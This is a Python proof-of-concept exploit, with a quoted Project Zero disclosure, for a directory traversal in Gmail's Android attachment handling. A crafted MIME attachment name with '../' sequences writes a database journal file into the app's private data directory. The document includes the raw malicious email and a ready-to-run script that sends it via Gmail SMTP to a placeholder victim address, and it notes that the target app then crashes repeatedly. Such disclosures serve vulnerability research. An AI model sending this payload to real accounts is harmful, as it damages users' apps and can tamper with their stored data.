'''
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1342

There is a directory traversal issue in attachment downloads in Gmail. For non-gmail accounts, there is no path sanitization on the attachment filename in the email, so when attachments are downloaded, a file with any name and any contents can be written to anywhere on the filesystem that the Gmail app can access. This bug has the following limitations:

1) the email address has to be a non-Gmail and non Gmailified (Hotmail or Yahoo)  account
2) the file can not overwrite an existing file, it has to be a file that doesn't already exist
3) there user has to click to download the attachment (and the path looks a bit weird on the screen)

It is possible to modify a EmailProviderBody database using this bug by placing a journal file in the databases directory.

Below is a PoC of an email that causes this issue. Attached is a python script that will send an email that causes this issue (don't forget to add in the to and from addresses, and your Gmail credentials). WARNING: this PoC will cause Gmail to crash repeatedly, and you will need to re-install it to get it to work again

Content-Type: multipart/mixed; boundary="---
-714A286D976BF3E58D9D671E37CBCF7C"
MIME-Version: 1.0
Subject: hello
To: <address>
From: natashenka@google.com

You will not see this in a MIME-aware mail reader.

------714A286D976BF3E58D9D671E37CBCF7C
Content-Type: text/html

<html><body><b>test</b></body></html>

------714A286D976BF3E58D9D671E37CBCF7C
Content-Type: audio/wav; name="../../../../data/data/com.google.android.gm/databases/EmailProviderBody.db-journal"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="test"

2dUF+SChY9f/////AAAAABAAAAAAAQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGRyb2lkX21l
dGFkYXRhYW5kcm9pZF9tZXRhZGF0YQNDUkVBVEUgVEFCTEUgAAAARlkAAABFSgAAAEs7AAAASSw=

------714A286D976BF3E58D9D671E37CBCF7C
'''

import os
import sys
import smtplib
import mimetypes

from optparse import OptionParser

from email import encoders
from email.message import Message
from email.mime.audio import MIMEAudio
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import subprocess
import random


def main():



    FROM_ADDRESS = "YOUR FROM ADDRESS HERE"
    YOUR_CREDENTIAL = "GET A GOOGLE ACCOUNT TEMPORARY PASSWORD AND PUT IT HERE"
    TO_ADDRESS = "ACCOUNT TO ATTACK HERE"



    composed = """Content-Type: multipart/signed; protocol="application/x-pkcs7-signature"; micalg=sha1; boundary="----714A286D976BF3E58D9D671E37CBCF7C"
MIME-Version: 1.0
Subject: hello image2adfdfs1
To: """+ TO_ADDRESS +"""
From: """ + FROM_ADDRESS + """

You will not see this in a MIME-aware mail reader.

------714A286D976BF3E58D9D671E37CBCF7C
Content-Type: text/html

<html><body><b>test</b></body></html>

------714A286D976BF3E58D9D671E37CBCF7C
Content-Type: audio/wav; name="../../../../data/data/com.google.android.gm/databases/EmailProviderBody.db-journal"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="%2e%2e%2fqpng"

2dUF+SChY9f/////AAAAABAAAAAAAQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGRyb2lkX21l
dGFkYXRhYW5kcm9pZF9tZXRhZGF0YQNDUkVBVEUgVEFCTEUgAAAARlkAAABFSgAAAEs7AAAASSw=

------714A286D976BF3E58D9D671E37CBCF7C"""




    s = smtplib.SMTP_SSL("smtp.gmail.com")
    s.login(FROM_ADDRESS, YOUR_CREDENTIAL)
    you = TO_ADDRESS
    s.sendmail(FROM_ADDRESS, you, composed)
    s.quit()


if __name__ == '__main__':
    main()